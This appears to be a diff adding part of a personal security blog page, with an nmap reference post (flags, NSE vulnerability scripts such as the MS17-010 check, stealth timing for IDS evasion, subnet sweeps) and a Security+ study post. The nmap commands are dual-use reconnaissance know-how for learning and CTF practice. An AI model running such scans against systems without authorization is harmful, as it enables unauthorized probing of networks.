+          <li><em>-O</em> — OS detection. Requires root. Useful for identifying Windows vs Linux targets quickly.</li>
+          <li><em>-Pn</em> — skip host discovery (ping). Use when ICMP is blocked — common on CTF targets and hardened hosts.</li>
+          <li><em>-oA output</em> — save results in all formats (normal, XML, grepable) at once. Always do this.</li>
+          <li><em>--open</em> — only show open ports. Cuts clutter when scanning subnets.</li>
+        </ul>
+
+        <h2>NSE Scripts Worth Knowing</h2>
+        <pre># SMB vulnerability check (MS17-010, EternalBlue)
+nmap --script smb-vuln-ms17-010 -p 445 &lt;TARGET&gt;
+
+# Full SMB enumeration
+nmap --script smb-enum-shares,smb-enum-users -p 445 &lt;TARGET&gt;
+
+# HTTP enumeration
+nmap --script http-enum -p 80,443 &lt;TARGET&gt;
+
+# FTP anonymous login check
+nmap --script ftp-anon -p 21 &lt;TARGET&gt;
+
+# Run all vuln scripts (noisy but thorough)
+nmap --script vuln &lt;TARGET&gt;</pre>
+
+        <h2>Timing Templates</h2>
+        <ul>
+          <li><em>-T1 / -T2</em> — slow, stealthy. Useful for evading IDS in real engagements.</li>
+          <li><em>-T3</em> — default. Balanced speed and reliability.</li>
+          <li><em>-T4</em> — faster. Fine for CTFs and lab environments where stealth doesn't matter.</li>
+          <li><em>-T5</em> — insane speed. Can miss results on unreliable networks.</li>
+        </ul>
+
+        <h2>Subnet Scanning</h2>
+        <pre># Scan a /24 for live hosts (ping sweep)
+nmap -sn 192.168.1.0/24
+
+# Quick port scan across a subnet
+nmap -p 22,80,443,445 --open 192.168.1.0/24</pre>
+        <div class="note"><strong>// Reminder:</strong> Save your output every time with -oA. There's nothing worse than finding something interesting and not having the scan results to reference later.</div>
+      `
+    },
+    {
+      id: 5,
+      date: 'Nov 2024',
+      title: 'What I Learned Studying for CompTIA Security+',
+      excerpt: 'Resources, study strategies, and the things that actually showed up on the exam — plus what I\'d do differently.',
+      tags: 'general',
+      tagHTML: '<span class="tag">Security+</span><span class="tag">Certs</span>',
+      kicker: '// Certifications · Study Notes',
+      body: `
+        <h2>Background</h2>
+        <p>Security+ was my first formal cybersecurity certification. I came into it with a solid IT background from helpdesk work but limited formal security training. Here's an honest breakdown of what worked, what didn't, and what actually showed up on the exam.</p>
+
+        <h2>Resources I Used</h2>
+        <ul>
+          <li><em>Professor Messer's SY0-701 Course</em> — Free on YouTube. Thorough, well-organized, and kept up to date. This was my primary resource.</li>
+          <li><em>Jason Dion's Practice Exams (Udemy)</em> — The closest thing to the real exam format. Do these last when you're close to ready, not early — save them as a calibration tool.</li>
+          <li><em>CompTIA's CertMaster Learn</em> — Expensive and not worth it if you're budget-conscious. Professor Messer covers the same material better for free.</li>
+          <li><em>TryHackMe — Pre-Security & SOC Level 1 paths</em> — Not directly Security+ content, but hands-on practice made the concepts stick much better than flashcards.</li>
+        </ul>
+
+        <h2>Study Strategy</h2>
+        <p>I studied for about 6 weeks, roughly an hour a day with heavier sessions on weekends. My approach:</p>
+        <ul>
+          <li>Watch Professor Messer's videos for a domain, then immediately do 20-30 related practice questions.</li>
+          <li>Keep a running notes doc of anything I got wrong and why.</li>
+          <li>In the final two weeks, switch almost entirely to practice exams. Aim for 85%+ consistently before scheduling.</li>
+          <li>Don't just memorize answers — understand <em>why</em> an answer is correct. The exam loves scenario-based questions that require actual reasoning.</li>
+        </ul>
+
+        <h2>What Actually Showed Up</h2>
+        <ul>
+          <li><em>Cryptography</em> — More than expected. Know the difference between symmetric vs asymmetric, common algorithms (AES, RSA, SHA), and when to use each.</li>
+          <li><em>Network security concepts</em> — Firewalls, IDS/IPS, VPNs, segmentation. Know what each does and the differences between similar technologies.</li>
+          <li><em>Threat actors and attack types</em> — Social engineering, phishing variants, insider threats. These are scenario-heavy.</li>
+          <li><em>Incident response</em> — The IR lifecycle comes up a lot. Know the phases cold.</li>
+          <li><em>Cloud and identity concepts</em> — The SY0-701 version leans heavily into cloud. Zero Trust, IAM, MFA, SSO.</li>
+        </ul>
+
+        <h2>What I'd Do Differently</h2>
+        <ul>
+          <li>Start practice exams earlier — I waited too long and some of the early study time was inefficient.</li>
+          <li>Spend more time on cryptography. I underestimated how much it showed up.</li>
+          <li>Do more hands-on labs alongside the theory — concepts sink in much faster when you've actually done them.</li>
+        </ul>
+        <div class="note"><strong>// Bottom line:</strong> Professor Messer + Dion practice exams is the winning combination. Don't overthink the resources — consistency matters more than the perfect study material.</div>
+      `
+    }
+  ];
+
+  // ── FOLDER STRIP ──────────────────────────────────────────────────────────
+  const FOLDERS = [
+    { label:'Blog', href:'blog.html', id:'blog' },
+    { label:'Projects', href:'projects.html', id:'projects' },
+    { label:'Photos', href:'photography.html', id:'photography' },
+    { label:'About', href:'about.html', id:'about' },
+    { label:'Resume', href:'resume.html', id:'resume' },
+    { label:'Consult', href:'consulting.html', id:'consulting' },
+  ];
+  const CURRENT = 'blog';
+  const folderPath = `<path d="M8 32 L8 22 Q8 20 10 20 L38 20 Q42 20 44 24 L50 32 L112 32 Q114 32 114 34 L114 88 Q114 90 112 90 L8 90 Q6 90 6 88 L6 34 Q6 32 8 32 Z" fill="#0f0f0f" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/>`;
+  document.getElementById('folder-strip').innerHTML = FOLDERS.map(f =>
+    `<a href="${f.href}" class="fstrip-item${f.id===CURRENT?' active':''}">
+      <svg class="fstrip-svg" viewBox="0 0 120 96" fill="none" xmlns="http://www.w3.org/2000/svg">${folderPath}</svg>
+      <span class="fstrip-label">${f.label}</span>
+    </a>`
+  ).join('');
+
+  // ── RENDER POST LIST ──────────────────────────────────────────────────────
+  function renderPosts(filter) {
+    const list = document.getElementById('post-list');
+    const filtered = posts.filter(p => filter === 'all' || p.tags.includes(filter));
+    list.innerHTML = filtered.map(p => `
+      <div class="post-card" data-tags="${p.tags}" onclick="openArticle(${p.id})">
+        <span class="post-date">${p.date}</span>
+        <div class="post-meta">
+          <span class="post-title">${p.title}</span>
+          <span class="post-excerpt">${p.excerpt}</span>
+          <div class="post-tags">${p.tagHTML}</div>
+        </div>
+        <span class="post-arrow">→</span>
+      </div>
+    `).join('');
+  }
+
+  // ── FILTER ────────────────────────────────────────────────────────────────
+  function filterPosts(tag, btn) {
+    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    renderPosts(tag);
+  }
+
+  // ── ARTICLE OPEN / CLOSE ──────────────────────────────────────────────────
+  function openArticle(id) {
+    const p = posts.find(x => x.id === id);
+    document.getElementById('article-kicker').textContent = p.kicker;
+    document.getElementById('article-title').textContent = p.title;
+    document.getElementById('article-tags').innerHTML = p.tagHTML;
+    document.getElementById('article-prose').innerHTML = p.body;
+    document.getElementById('article-date-nav').textContent = p.date;
+    const overlay = document.getElementById('article-overlay');
+    overlay.classList.add('open');
+    overlay.scrollTop = 0;
+    document.body.style.overflow = 'hidden';
+  }
+
+  function closeArticle() {
+    document.getElementById('article-overlay').classList.remove('open');
+    document.body.style.overflow = '';
+  }
+
+  document.addEventListener('keydown', e => { if (e.key === 'Escape') closeArticle(); });
+
+  // ── INIT ──────────────────────────────────────────────────────────────────
+  renderPosts('all');
+</script>
+
+</body>
+</html>
